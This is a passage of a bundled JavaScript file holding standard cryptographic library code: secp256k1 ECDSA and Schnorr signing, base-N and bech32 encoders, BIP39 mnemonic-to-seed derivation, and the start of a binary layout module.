      }
      exports.sign = sign;
      function signSync(msgHash, privKey, opts = {}) {
        const {
          seed,
          m,
          d
        } = initSigArgs(msgHash, privKey, opts.extraEntropy);
        let sig;
        const drbg = new HmacDrbg();
        drbg.reseedSync(seed);
        while (!(sig = kmdToSig(drbg.generateSync(), m, d))) drbg.reseedSync();
        return finalizeSig(sig, opts);
      }
      exports.signSync = signSync;
      const vopts = {
        strict: true
      };
      function verify(signature, msgHash, publicKey, opts = vopts) {
        let sig;
        try {
          sig = normalizeSignature(signature);
          msgHash = ensureBytes(msgHash);
        } catch (error) {
          return false;
        }
        const {
          r,
          s
        } = sig;
        if (opts.strict && sig.hasHighS()) return false;
        const h = truncateHash(msgHash);
        let P;
        try {
          P = normalizePublicKey(publicKey);
        } catch (error) {
          return false;
        }
        const {
          n
        } = CURVE;
        const sinv = invert(s, n);
        const u1 = mod(h * sinv, n);
        const u2 = mod(r * sinv, n);
        const R = Point.BASE.multiplyAndAddUnsafe(P, u1, u2);
        if (!R) return false;
        const v = mod(R.x, n);
        return v === r;
      }
      exports.verify = verify;
      function schnorrChallengeFinalize(ch) {
        return mod(bytesToNumber(ch), CURVE.n);
      }
      class SchnorrSignature {
        constructor(r, s) {
          this.r = r;
          this.s = s;
          this.assertValidity();
        }
        static fromHex(hex) {
          const bytes = ensureBytes(hex);
          if (bytes.length !== 64) throw new TypeError(`SchnorrSignature.fromHex: expected 64 bytes, not ${bytes.length}`);
          const r = bytesToNumber(bytes.subarray(0, 32));
          const s = bytesToNumber(bytes.subarray(32, 64));
          return new SchnorrSignature(r, s);
        }
        assertValidity() {
          const {
            r,
            s
          } = this;
          if (!isValidFieldElement(r) || !isWithinCurveOrder(s)) throw new Error('Invalid signature');
        }
        toHex() {
          return numTo32bStr(this.r) + numTo32bStr(this.s);
        }
        toRawBytes() {
          return hexToBytes(this.toHex());
        }
      }
      function schnorrGetPublicKey(privateKey) {
        return Point.fromPrivateKey(privateKey).toRawX();
      }
      class InternalSchnorrSignature {
        constructor(message, privateKey, auxRand = exports.utils.randomBytes()) {
          if (message == null) throw new TypeError(`sign: Expected valid message, not "${message}"`);
          this.m = ensureBytes(message);
          const {
            x,
            scalar
          } = this.getScalar(normalizePrivateKey(privateKey));
          this.px = x;
          this.d = scalar;
          this.rand = ensureBytes(auxRand);
          if (this.rand.length !== 32) throw new TypeError('sign: Expected 32 bytes of aux randomness');
        }
        getScalar(priv) {
          const point = Point.fromPrivateKey(priv);
          const scalar = point.hasEvenY() ? priv : CURVE.n - priv;
          return {
            point,
            scalar,
            x: point.toRawX()
          };
        }
        initNonce(d, t0h) {
          return numTo32b(d ^ bytesToNumber(t0h));
        }
        finalizeNonce(k0h) {
          const k0 = mod(bytesToNumber(k0h), CURVE.n);
          if (k0 === _0n) throw new Error('sign: Creation of signature failed. k is zero');
          const {
            point: R,
            x: rx,
            scalar: k
          } = this.getScalar(k0);
          return {
            R,
            rx,
            k
          };
        }
        finalizeSig(R, k, e, d) {
          return new SchnorrSignature(R.x, mod(k + e * d, CURVE.n)).toRawBytes();
        }
        error() {
          throw new Error('sign: Invalid signature produced');
        }
        async calc() {
          const {
            m,
            d,
            px,
            rand
          } = this;
          const tag = exports.utils.taggedHash;
          const t = this.initNonce(d, await tag(TAGS.aux, rand));
          const {
            R,
            rx,
            k
          } = this.finalizeNonce(await tag(TAGS.nonce, t, px, m));
          const e = schnorrChallengeFinalize(await tag(TAGS.challenge, rx, px, m));
          const sig = this.finalizeSig(R, k, e, d);
          if (!(await schnorrVerify(sig, m, px))) this.error();
          return sig;
        }
        calcSync() {
          const {
            m,
            d,
            px,
            rand
          } = this;
          const tag = exports.utils.taggedHashSync;
          const t = this.initNonce(d, tag(TAGS.aux, rand));
          const {
            R,
            rx,
            k
          } = this.finalizeNonce(tag(TAGS.nonce, t, px, m));
          const e = schnorrChallengeFinalize(tag(TAGS.challenge, rx, px, m));
          const sig = this.finalizeSig(R, k, e, d);
          if (!schnorrVerifySync(sig, m, px)) this.error();
          return sig;
        }
      }
      async function schnorrSign(msg, privKey, auxRand) {
        return new InternalSchnorrSignature(msg, privKey, auxRand).calc();
      }
      function schnorrSignSync(msg, privKey, auxRand) {
        return new InternalSchnorrSignature(msg, privKey, auxRand).calcSync();
      }
      function initSchnorrVerify(signature, message, publicKey) {
        const raw = signature instanceof SchnorrSignature;
        const sig = raw ? signature : SchnorrSignature.fromHex(signature);
        if (raw) sig.assertValidity();
        return {
          ...sig,
          m: ensureBytes(message),
          P: normalizePublicKey(publicKey)
        };
      }
      function finalizeSchnorrVerify(r, P, s, e) {
        const R = Point.BASE.multiplyAndAddUnsafe(P, normalizePrivateKey(s), mod(-e, CURVE.n));
        if (!R || !R.hasEvenY() || R.x !== r) return false;
        return true;
      }
      async function schnorrVerify(signature, message, publicKey) {
        try {
          const {
            r,
            s,
            m,
            P
          } = initSchnorrVerify(signature, message, publicKey);
          const e = schnorrChallengeFinalize(await exports.utils.taggedHash(TAGS.challenge, numTo32b(r), P.toRawX(), m));
          return finalizeSchnorrVerify(r, P, s, e);
        } catch (error) {
          return false;
        }
      }
      function schnorrVerifySync(signature, message, publicKey) {
        try {
          const {
            r,
            s,
            m,
            P
          } = initSchnorrVerify(signature, message, publicKey);
          const e = schnorrChallengeFinalize(exports.utils.taggedHashSync(TAGS.challenge, numTo32b(r), P.toRawX(), m));
          return finalizeSchnorrVerify(r, P, s, e);
        } catch (error) {
          if (error instanceof ShaError) throw error;
          return false;
        }
      }
      exports.schnorr = {
        Signature: SchnorrSignature,
        getPublicKey: schnorrGetPublicKey,
        sign: schnorrSign,
        verify: schnorrVerify,
        signSync: schnorrSignSync,
        verifySync: schnorrVerifySync
      };
      Point.BASE._setWindowSize(8);
      const crypto = {
        node: nodeCrypto,
        web: typeof self === 'object' && 'crypto' in self ? self.crypto : undefined
      };
      const TAGS = {
        challenge: 'BIP0340/challenge',
        aux: 'BIP0340/aux',
        nonce: 'BIP0340/nonce'
      };
      const TAGGED_HASH_PREFIXES = {};
      exports.utils = {
        bytesToHex,
        hexToBytes,
        concatBytes,
        mod,
        invert,
        isValidPrivateKey(privateKey) {
          try {
            normalizePrivateKey(privateKey);
            return true;
          } catch (error) {
            return false;
          }
        },
        _bigintTo32Bytes: numTo32b,
        _normalizePrivateKey: normalizePrivateKey,
        hashToPrivateKey: hash => {
          hash = ensureBytes(hash);
          if (hash.length < 40 || hash.length > 1024) throw new Error('Expected 40-1024 bytes of private key as per FIPS 186');
          const num = mod(bytesToNumber(hash), CURVE.n - _1n) + _1n;
          return numTo32b(num);
        },
        randomBytes: (bytesLength = 32) => {
          if (crypto.web) {
            return crypto.web.getRandomValues(new Uint8Array(bytesLength));
          } else if (crypto.node) {
            const {
              randomBytes
            } = crypto.node;
            return Uint8Array.from(randomBytes(bytesLength));
          } else {
            throw new Error("The environment doesn't have randomBytes function");
          }
        },
        randomPrivateKey: () => {
          return exports.utils.hashToPrivateKey(exports.utils.randomBytes(40));
        },
        sha256: async (...messages) => {
          if (crypto.web) {
            const buffer = await crypto.web.subtle.digest('SHA-256', concatBytes(...messages));
            return new Uint8Array(buffer);
          } else if (crypto.node) {
            const {
              createHash
            } = crypto.node;
            const hash = createHash('sha256');
            messages.forEach(m => hash.update(m));
            return Uint8Array.from(hash.digest());
          } else {
            throw new Error("The environment doesn't have sha256 function");
          }
        },
        hmacSha256: async (key, ...messages) => {
          if (crypto.web) {
            const ckey = await crypto.web.subtle.importKey('raw', key, {
              name: 'HMAC',
              hash: {
                name: 'SHA-256'
              }
            }, false, ['sign']);
            const message = concatBytes(...messages);
            const buffer = await crypto.web.subtle.sign('HMAC', ckey, message);
            return new Uint8Array(buffer);
          } else if (crypto.node) {
            const {
              createHmac
            } = crypto.node;
            const hash = createHmac('sha256', key);
            messages.forEach(m => hash.update(m));
            return Uint8Array.from(hash.digest());
          } else {
            throw new Error("The environment doesn't have hmac-sha256 function");
          }
        },
        sha256Sync: undefined,
        hmacSha256Sync: undefined,
        taggedHash: async (tag, ...messages) => {
          let tagP = TAGGED_HASH_PREFIXES[tag];
          if (tagP === undefined) {
            const tagH = await exports.utils.sha256(Uint8Array.from(tag, c => c.charCodeAt(0)));
            tagP = concatBytes(tagH, tagH);
            TAGGED_HASH_PREFIXES[tag] = tagP;
          }
          return exports.utils.sha256(tagP, ...messages);
        },
        taggedHashSync: (tag, ...messages) => {
          if (typeof _sha256Sync !== 'function') throw new ShaError('sha256Sync is undefined, you need to set it');
          let tagP = TAGGED_HASH_PREFIXES[tag];
          if (tagP === undefined) {
            const tagH = _sha256Sync(Uint8Array.from(tag, c => c.charCodeAt(0)));
            tagP = concatBytes(tagH, tagH);
            TAGGED_HASH_PREFIXES[tag] = tagP;
          }
          return _sha256Sync(tagP, ...messages);
        },
        precompute(windowSize = 8, point = Point.BASE) {
          const cached = point === Point.BASE ? point : new Point(point.x, point.y);
          cached._setWindowSize(windowSize);
          cached.multiply(_3n);
          return cached;
        }
      };
      Object.defineProperties(exports.utils, {
        sha256Sync: {
          configurable: false,
          get() {
            return _sha256Sync;
          },
          set(val) {
            if (!_sha256Sync) _sha256Sync = val;
          }
        },
        hmacSha256Sync: {
          configurable: false,
          get() {
            return _hmacSha256Sync;
          },
          set(val) {
            if (!_hmacSha256Sync) _hmacSha256Sync = val;
          }
        }
      });
    }, {
      "crypto": 2
    }],
    45: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.bytes = exports.stringToBytes = exports.str = exports.bytesToString = exports.hex = exports.utf8 = exports.bech32m = exports.bech32 = exports.base58check = exports.base58xmr = exports.base58xrp = exports.base58flickr = exports.base58 = exports.base64url = exports.base64 = exports.base32crockford = exports.base32hex = exports.base32 = exports.base16 = exports.utils = exports.assertNumber = void 0;
      function assertNumber(n) {
        if (!Number.isSafeInteger(n)) throw new Error(`Wrong integer: ${n}`);
      }
      exports.assertNumber = assertNumber;
      function chain(...args) {
        const wrap = (a, b) => c => a(b(c));
        const encode = Array.from(args).reverse().reduce((acc, i) => acc ? wrap(acc, i.encode) : i.encode, undefined);
        const decode = args.reduce((acc, i) => acc ? wrap(acc, i.decode) : i.decode, undefined);
        return {
          encode,
          decode
        };
      }
      function alphabet(alphabet) {
        return {
          encode: digits => {
            if (!Array.isArray(digits) || digits.length && typeof digits[0] !== 'number') throw new Error('alphabet.encode input should be an array of numbers');
            return digits.map(i => {
              assertNumber(i);
              if (i < 0 || i >= alphabet.length) throw new Error(`Digit index outside alphabet: ${i} (alphabet: ${alphabet.length})`);
              return alphabet[i];
            });
          },
          decode: input => {
            if (!Array.isArray(input) || input.length && typeof input[0] !== 'string') throw new Error('alphabet.decode input should be array of strings');
            return input.map(letter => {
              if (typeof letter !== 'string') throw new Error(`alphabet.decode: not string element=${letter}`);
              const index = alphabet.indexOf(letter);
              if (index === -1) throw new Error(`Unknown letter: "${letter}". Allowed: ${alphabet}`);
              return index;
            });
          }
        };
      }
      function join(separator = '') {
        if (typeof separator !== 'string') throw new Error('join separator should be string');
        return {
          encode: from => {
            if (!Array.isArray(from) || from.length && typeof from[0] !== 'string') throw new Error('join.encode input should be array of strings');
            for (let i of from) if (typeof i !== 'string') throw new Error(`join.encode: non-string input=${i}`);
            return from.join(separator);
          },
          decode: to => {
            if (typeof to !== 'string') throw new Error('join.decode input should be string');
            return to.split(separator);
          }
        };
      }
      function padding(bits, chr = '=') {
        assertNumber(bits);
        if (typeof chr !== 'string') throw new Error('padding chr should be string');
        return {
          encode(data) {
            if (!Array.isArray(data) || data.length && typeof data[0] !== 'string') throw new Error('padding.encode input should be array of strings');
            for (let i of data) if (typeof i !== 'string') throw new Error(`padding.encode: non-string input=${i}`);
            while (data.length * bits % 8) data.push(chr);
            return data;
          },
          decode(input) {
            if (!Array.isArray(input) || input.length && typeof input[0] !== 'string') throw new Error('padding.encode input should be array of strings');
            for (let i of input) if (typeof i !== 'string') throw new Error(`padding.decode: non-string input=${i}`);
            let end = input.length;
            if (end * bits % 8) throw new Error('Invalid padding: string should have whole number of bytes');
            for (; end > 0 && input[end - 1] === chr; end--) {
              if (!((end - 1) * bits % 8)) throw new Error('Invalid padding: string has too much padding');
            }
            return input.slice(0, end);
          }
        };
      }
      function normalize(fn) {
        if (typeof fn !== 'function') throw new Error('normalize fn should be function');
        return {
          encode: from => from,
          decode: to => fn(to)
        };
      }
      function convertRadix(data, from, to) {
        if (from < 2) throw new Error(`convertRadix: wrong from=${from}, base cannot be less than 2`);
        if (to < 2) throw new Error(`convertRadix: wrong to=${to}, base cannot be less than 2`);
        if (!Array.isArray(data)) throw new Error('convertRadix: data should be array');
        if (!data.length) return [];
        let pos = 0;
        const res = [];
        const digits = Array.from(data);
        digits.forEach(d => {
          assertNumber(d);
          if (d < 0 || d >= from) throw new Error(`Wrong integer: ${d}`);
        });
        while (true) {
          let carry = 0;
          let done = true;
          for (let i = pos; i < digits.length; i++) {
            const digit = digits[i];
            const digitBase = from * carry + digit;
            if (!Number.isSafeInteger(digitBase) || from * carry / from !== carry || digitBase - digit !== from * carry) {
              throw new Error('convertRadix: carry overflow');
            }
            carry = digitBase % to;
            digits[i] = Math.floor(digitBase / to);
            if (!Number.isSafeInteger(digits[i]) || digits[i] * to + carry !== digitBase) throw new Error('convertRadix: carry overflow');
            if (!done) continue;else if (!digits[i]) pos = i;else done = false;
          }
          res.push(carry);
          if (done) break;
        }
        for (let i = 0; i < data.length - 1 && data[i] === 0; i++) res.push(0);
        return res.reverse();
      }
      const gcd = (a, b) => !b ? a : gcd(b, a % b);
      const radix2carry = (from, to) => from + (to - gcd(from, to));
      function convertRadix2(data, from, to, padding) {
        if (!Array.isArray(data)) throw new Error('convertRadix2: data should be array');
        if (from <= 0 || from > 32) throw new Error(`convertRadix2: wrong from=${from}`);
        if (to <= 0 || to > 32) throw new Error(`convertRadix2: wrong to=${to}`);
        if (radix2carry(from, to) > 32) {
          throw new Error(`convertRadix2: carry overflow from=${from} to=${to} carryBits=${radix2carry(from, to)}`);
        }
        let carry = 0;
        let pos = 0;
        const mask = 2 ** to - 1;
        const res = [];
        for (const n of data) {
          assertNumber(n);
          if (n >= 2 ** from) throw new Error(`convertRadix2: invalid data word=${n} from=${from}`);
          carry = carry << from | n;
          if (pos + from > 32) throw new Error(`convertRadix2: carry overflow pos=${pos} from=${from}`);
          pos += from;
          for (; pos >= to; pos -= to) res.push((carry >> pos - to & mask) >>> 0);
          carry &= 2 ** pos - 1;
        }
        carry = carry << to - pos & mask;
        if (!padding && pos >= from) throw new Error('Excess padding');
        if (!padding && carry) throw new Error(`Non-zero padding: ${carry}`);
        if (padding && pos > 0) res.push(carry >>> 0);
        return res;
      }
      function radix(num) {
        assertNumber(num);
        return {
          encode: bytes => {
            if (!(bytes instanceof Uint8Array)) throw new Error('radix.encode input should be Uint8Array');
            return convertRadix(Array.from(bytes), 2 ** 8, num);
          },
          decode: digits => {
            if (!Array.isArray(digits) || digits.length && typeof digits[0] !== 'number') throw new Error('radix.decode input should be array of strings');
            return Uint8Array.from(convertRadix(digits, num, 2 ** 8));
          }
        };
      }
      function radix2(bits, revPadding = false) {
        assertNumber(bits);
        if (bits <= 0 || bits > 32) throw new Error('radix2: bits should be in (0..32]');
        if (radix2carry(8, bits) > 32 || radix2carry(bits, 8) > 32) throw new Error('radix2: carry overflow');
        return {
          encode: bytes => {
            if (!(bytes instanceof Uint8Array)) throw new Error('radix2.encode input should be Uint8Array');
            return convertRadix2(Array.from(bytes), 8, bits, !revPadding);
          },
          decode: digits => {
            if (!Array.isArray(digits) || digits.length && typeof digits[0] !== 'number') throw new Error('radix2.decode input should be array of strings');
            return Uint8Array.from(convertRadix2(digits, bits, 8, revPadding));
          }
        };
      }
      function unsafeWrapper(fn) {
        if (typeof fn !== 'function') throw new Error('unsafeWrapper fn should be function');
        return function (...args) {
          try {
            return fn.apply(null, args);
          } catch (e) {}
        };
      }
      function checksum(len, fn) {
        assertNumber(len);
        if (typeof fn !== 'function') throw new Error('checksum fn should be function');
        return {
          encode(data) {
            if (!(data instanceof Uint8Array)) throw new Error('checksum.encode: input should be Uint8Array');
            const checksum = fn(data).slice(0, len);
            const res = new Uint8Array(data.length + len);
            res.set(data);
            res.set(checksum, data.length);
            return res;
          },
          decode(data) {
            if (!(data instanceof Uint8Array)) throw new Error('checksum.decode: input should be Uint8Array');
            const payload = data.slice(0, -len);
            const newChecksum = fn(payload).slice(0, len);
            const oldChecksum = data.slice(-len);
            for (let i = 0; i < len; i++) if (newChecksum[i] !== oldChecksum[i]) throw new Error('Invalid checksum');
            return payload;
          }
        };
      }
      exports.utils = {
        alphabet,
        chain,
        checksum,
        radix,
        radix2,
        join,
        padding
      };
      exports.base16 = chain(radix2(4), alphabet('0123456789ABCDEF'), join(''));
      exports.base32 = chain(radix2(5), alphabet('ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'), padding(5), join(''));
      exports.base32hex = chain(radix2(5), alphabet('0123456789ABCDEFGHIJKLMNOPQRSTUV'), padding(5), join(''));
      exports.base32crockford = chain(radix2(5), alphabet('0123456789ABCDEFGHJKMNPQRSTVWXYZ'), join(''), normalize(s => s.toUpperCase().replace(/O/g, '0').replace(/[IL]/g, '1')));
      exports.base64 = chain(radix2(6), alphabet('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'), padding(6), join(''));
      exports.base64url = chain(radix2(6), alphabet('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'), padding(6), join(''));
      const genBase58 = abc => chain(radix(58), alphabet(abc), join(''));
      exports.base58 = genBase58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz');
      exports.base58flickr = genBase58('123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ');
      exports.base58xrp = genBase58('rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz');
      const XMR_BLOCK_LEN = [0, 2, 3, 5, 6, 7, 9, 10, 11];
      exports.base58xmr = {
        encode(data) {
          let res = '';
          for (let i = 0; i < data.length; i += 8) {
            const block = data.subarray(i, i + 8);
            res += exports.base58.encode(block).padStart(XMR_BLOCK_LEN[block.length], '1');
          }
          return res;
        },
        decode(str) {
          let res = [];
          for (let i = 0; i < str.length; i += 11) {
            const slice = str.slice(i, i + 11);
            const blockLen = XMR_BLOCK_LEN.indexOf(slice.length);
            const block = exports.base58.decode(slice);
            for (let j = 0; j < block.length - blockLen; j++) {
              if (block[j] !== 0) throw new Error('base58xmr: wrong padding');
            }
            res = res.concat(Array.from(block.slice(block.length - blockLen)));
          }
          return Uint8Array.from(res);
        }
      };
      const base58check = sha256 => chain(checksum(4, data => sha256(sha256(data))), exports.base58);
      exports.base58check = base58check;
      const BECH_ALPHABET = chain(alphabet('qpzry9x8gf2tvdw0s3jn54khce6mua7l'), join(''));
      const POLYMOD_GENERATORS = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3];
      function bech32Polymod(pre) {
        const b = pre >> 25;
        let chk = (pre & 0x1ffffff) << 5;
        for (let i = 0; i < POLYMOD_GENERATORS.length; i++) {
          if ((b >> i & 1) === 1) chk ^= POLYMOD_GENERATORS[i];
        }
        return chk;
      }
      function bechChecksum(prefix, words, encodingConst = 1) {
        const len = prefix.length;
        let chk = 1;
        for (let i = 0; i < len; i++) {
          const c = prefix.charCodeAt(i);
          if (c < 33 || c > 126) throw new Error(`Invalid prefix (${prefix})`);
          chk = bech32Polymod(chk) ^ c >> 5;
        }
        chk = bech32Polymod(chk);
        for (let i = 0; i < len; i++) chk = bech32Polymod(chk) ^ prefix.charCodeAt(i) & 0x1f;
        for (let v of words) chk = bech32Polymod(chk) ^ v;
        for (let i = 0; i < 6; i++) chk = bech32Polymod(chk);
        chk ^= encodingConst;
        return BECH_ALPHABET.encode(convertRadix2([chk % 2 ** 30], 30, 5, false));
      }
      function genBech32(encoding) {
        const ENCODING_CONST = encoding === 'bech32' ? 1 : 0x2bc830a3;
        const _words = radix2(5);
        const fromWords = _words.decode;
        const toWords = _words.encode;
        const fromWordsUnsafe = unsafeWrapper(fromWords);
        function encode(prefix, words, limit = 90) {
          if (typeof prefix !== 'string') throw new Error(`bech32.encode prefix should be string, not ${typeof prefix}`);
          if (!Array.isArray(words) || words.length && typeof words[0] !== 'number') throw new Error(`bech32.encode words should be array of numbers, not ${typeof words}`);
          const actualLength = prefix.length + 7 + words.length;
          if (limit !== false && actualLength > limit) throw new TypeError(`Length ${actualLength} exceeds limit ${limit}`);
          prefix = prefix.toLowerCase();
          return `${prefix}1${BECH_ALPHABET.encode(words)}${bechChecksum(prefix, words, ENCODING_CONST)}`;
        }
        function decode(str, limit = 90) {
          if (typeof str !== 'string') throw new Error(`bech32.decode input should be string, not ${typeof str}`);
          if (str.length < 8 || limit !== false && str.length > limit) throw new TypeError(`Wrong string length: ${str.length} (${str}). Expected (8..${limit})`);
          const lowered = str.toLowerCase();
          if (str !== lowered && str !== str.toUpperCase()) throw new Error(`String must be lowercase or uppercase`);
          str = lowered;
          const sepIndex = str.lastIndexOf('1');
          if (sepIndex === 0 || sepIndex === -1) throw new Error(`Letter "1" must be present between prefix and data only`);
          const prefix = str.slice(0, sepIndex);
          const _words = str.slice(sepIndex + 1);
          if (_words.length < 6) throw new Error('Data must be at least 6 characters long');
          const words = BECH_ALPHABET.decode(_words).slice(0, -6);
          const sum = bechChecksum(prefix, words, ENCODING_CONST);
          if (!_words.endsWith(sum)) throw new Error(`Invalid checksum in ${str}: expected "${sum}"`);
          return {
            prefix,
            words
          };
        }
        const decodeUnsafe = unsafeWrapper(decode);
        function decodeToBytes(str) {
          const {
            prefix,
            words
          } = decode(str, false);
          return {
            prefix,
            words,
            bytes: fromWords(words)
          };
        }
        return {
          encode,
          decode,
          decodeToBytes,
          decodeUnsafe,
          fromWords,
          fromWordsUnsafe,
          toWords
        };
      }
      exports.bech32 = genBech32('bech32');
      exports.bech32m = genBech32('bech32m');
      exports.utf8 = {
        encode: data => new TextDecoder().decode(data),
        decode: str => new TextEncoder().encode(str)
      };
      exports.hex = chain(radix2(4), alphabet('0123456789abcdef'), join(''), normalize(s => {
        if (typeof s !== 'string' || s.length % 2) throw new TypeError(`hex.decode: expected string, got ${typeof s} with length ${s.length}`);
        return s.toLowerCase();
      }));
      const CODERS = {
        utf8: exports.utf8,
        hex: exports.hex,
        base16: exports.base16,
        base32: exports.base32,
        base64: exports.base64,
        base64url: exports.base64url,
        base58: exports.base58,
        base58xmr: exports.base58xmr
      };
      const coderTypeError = `Invalid encoding type. Available types: ${Object.keys(CODERS).join(', ')}`;
      const bytesToString = (type, bytes) => {
        if (typeof type !== 'string' || !CODERS.hasOwnProperty(type)) throw new TypeError(coderTypeError);
        if (!(bytes instanceof Uint8Array)) throw new TypeError('bytesToString() expects Uint8Array');
        return CODERS[type].encode(bytes);
      };
      exports.bytesToString = bytesToString;
      exports.str = exports.bytesToString;
      const stringToBytes = (type, str) => {
        if (!CODERS.hasOwnProperty(type)) throw new TypeError(coderTypeError);
        if (typeof str !== 'string') throw new TypeError('stringToBytes() expects string');
        return CODERS[type].decode(str);
      };
      exports.stringToBytes = stringToBytes;
      exports.bytes = exports.stringToBytes;
    }, {}],
    46: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.mnemonicToSeedSync = exports.mnemonicToSeed = exports.validateMnemonic = exports.entropyToMnemonic = exports.mnemonicToEntropy = exports.generateMnemonic = void 0;
      const _assert_1 = require("@noble/hashes/_assert");
      const pbkdf2_1 = require("@noble/hashes/pbkdf2");
      const sha256_1 = require("@noble/hashes/sha256");
      const sha512_1 = require("@noble/hashes/sha512");
      const utils_1 = require("@noble/hashes/utils");
      const base_1 = require("@scure/base");
      const isJapanese = wordlist => wordlist[0] === '\u3042\u3044\u3053\u304f\u3057\u3093';
      function nfkd(str) {
        if (typeof str !== 'string') throw new TypeError(`Invalid mnemonic type: ${typeof str}`);
        return str.normalize('NFKD');
      }
      function normalize(str) {
        const norm = nfkd(str);
        const words = norm.split(' ');
        if (![12, 15, 18, 21, 24].includes(words.length)) throw new Error('Invalid mnemonic');
        return {
          nfkd: norm,
          words
        };
      }
      function assertEntropy(entropy) {
        _assert_1.default.bytes(entropy, 16, 20, 24, 28, 32);
      }
      function generateMnemonic(wordlist, strength = 128) {
        _assert_1.default.number(strength);
        if (strength % 32 !== 0 || strength > 256) throw new TypeError('Invalid entropy');
        return entropyToMnemonic((0, utils_1.randomBytes)(strength / 8), wordlist);
      }
      exports.generateMnemonic = generateMnemonic;
      const calcChecksum = entropy => {
        const bitsLeft = 8 - entropy.length / 4;
        return new Uint8Array([(0, sha256_1.sha256)(entropy)[0] >> bitsLeft << bitsLeft]);
      };
      function getCoder(wordlist) {
        if (!Array.isArray(wordlist) || wordlist.length !== 2 ** 11 || typeof wordlist[0] !== 'string') throw new Error('Worlist: expected array of 2048 strings');
        wordlist.forEach(i => {
          if (typeof i !== 'string') throw new Error(`Wordlist: non-string element: ${i}`);
        });
        return base_1.utils.chain(base_1.utils.checksum(1, calcChecksum), base_1.utils.radix2(11, true), base_1.utils.alphabet(wordlist));
      }
      function mnemonicToEntropy(mnemonic, wordlist) {
        const {
          words
        } = normalize(mnemonic);
        const entropy = getCoder(wordlist).decode(words);
        assertEntropy(entropy);
        return entropy;
      }
      exports.mnemonicToEntropy = mnemonicToEntropy;
      function entropyToMnemonic(entropy, wordlist) {
        assertEntropy(entropy);
        const words = getCoder(wordlist).encode(entropy);
        return words.join(isJapanese(wordlist) ? '\u3000' : ' ');
      }
      exports.entropyToMnemonic = entropyToMnemonic;
      function validateMnemonic(mnemonic, wordlist) {
        try {
          mnemonicToEntropy(mnemonic, wordlist);
        } catch (e) {
          return false;
        }
        return true;
      }
      exports.validateMnemonic = validateMnemonic;
      const salt = passphrase => nfkd(`mnemonic${passphrase}`);
      function mnemonicToSeed(mnemonic, passphrase = '') {
        return (0, pbkdf2_1.pbkdf2Async)(sha512_1.sha512, normalize(mnemonic).nfkd, salt(passphrase), {
          c: 2048,
          dkLen: 64
        });
      }
      exports.mnemonicToSeed = mnemonicToSeed;
      function mnemonicToSeedSync(mnemonic, passphrase = '') {
        return (0, pbkdf2_1.pbkdf2)(sha512_1.sha512, normalize(mnemonic).nfkd, salt(passphrase), {
          c: 2048,
          dkLen: 64
        });
      }
      exports.mnemonicToSeedSync = mnemonicToSeedSync;
    }, {
      "@noble/hashes/_assert": 33,
      "@noble/hashes/pbkdf2": 38,
      "@noble/hashes/sha256": 40,
      "@noble/hashes/sha512": 42,
      "@noble/hashes/utils": 43,
      "@scure/base": 45
    }],
    47: [function (require, module, exports) {
      'use strict';

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.s16 = exports.s8 = exports.nu64be = exports.u48be = exports.u40be = exports.u32be = exports.u24be = exports.u16be = exports.nu64 = exports.u48 = exports.u40 = exports.u32 = exports.u24 = exports.u16 = exports.u8 = exports.offset = exports.greedy = exports.Constant = exports.UTF8 = exports.CString = exports.Blob = exports.Boolean = exports.BitField = exports.BitStructure = exports.VariantLayout = exports.Union = exports.UnionLayoutDiscriminator = exports.UnionDiscriminator = exports.Structure = exports.Sequence = exports.DoubleBE = exports.Double = exports.FloatBE = exports.Float = exports.NearInt64BE = exports.NearInt64 = exports.NearUInt64BE = exports.NearUInt64 = exports.IntBE = exports.Int = exports.UIntBE = exports.UInt = exports.OffsetLayout = exports.GreedyCount = exports.ExternalLayout = exports.bindConstructorLayout = exports.nameWithProperty = exports.Layout = exports.uint8ArrayToBuffer = exports.checkUint8Array = void 0;
      exports.constant = exports.utf8 = exports.cstr = exports.blob = exports.unionLayoutDiscriminator = exports.union = exports.seq = exports.bits = exports.struct = exports.f64be = exports.f64 = exports.f32be = exports.f32 = exports.ns64be = exports.s48be = exports.s40be = exports.s32be = exports.s24be = exports.s16be = exports.ns64 = exports.s48 = exports.s40 = exports.s32 = exports.s24 = void 0;
      const buffer_1 = require("buffer");
      function checkUint8Array(b) {
        if (!(b instanceof Uint8Array)) {
          throw new TypeError('b must be a Uint8Array');
        }
      }
      exports.checkUint8Array = checkUint8Array;
      function uint8ArrayToBuffer(b) {
        checkUint8Array(b);
        return buffer_1.Buffer.from(b.buffer, b.byteOffset, b.length);
      }
      exports.uint8ArrayToBuffer = uint8ArrayToBuffer;
      class Layout {
        constructor(span, property) {
          if (!Number.isInteger(span)) {
            throw new TypeError('span must be an integer');
          }
          this.span = span;
          this.property = property;
        }
        makeDestinationObject() {
          return {};
        }
        getSpan(b, offset) {
          if (0 > this.span) {
            throw new RangeError('indeterminate span');
          }
          return this.span;
        }
        replicate(property) {
          const rv = Object.create(this.constructor.prototype);
          Object.assign(rv, this);
          rv.property = property;
          return rv;
        }
        fromArray(values) {
          return undefined;
        }
      }
      exports.Layout = Layout;
      function nameWithProperty(name, lo) {
        if (lo.property) {
          return name + '[' + lo.property + ']';
        }
        return name;
      }
      exports.nameWithProperty = nameWithProperty;
      function bindConstructorLayout(Class, layout) {
        if ('function' !== typeof Class) {
          throw new TypeError('Class must be constructor');
        }
        if (Object.prototype.hasOwnProperty.call(Class, 'layout_')) {
          throw new Error('Class is already bound to a layout');
        }
        if (!(layout && layout instanceof Layout)) {
          throw new TypeError('layout must be a Layout');
        }
        if (Object.prototype.hasOwnProperty.call(layout, 'boundConstructor_')) {
          throw new Error('layout is already bound to a constructor');
        }
        Class.layout_ = layout;
        layout.boundConstructor_ = Class;
        layout.makeDestinationObject = () => new Class();
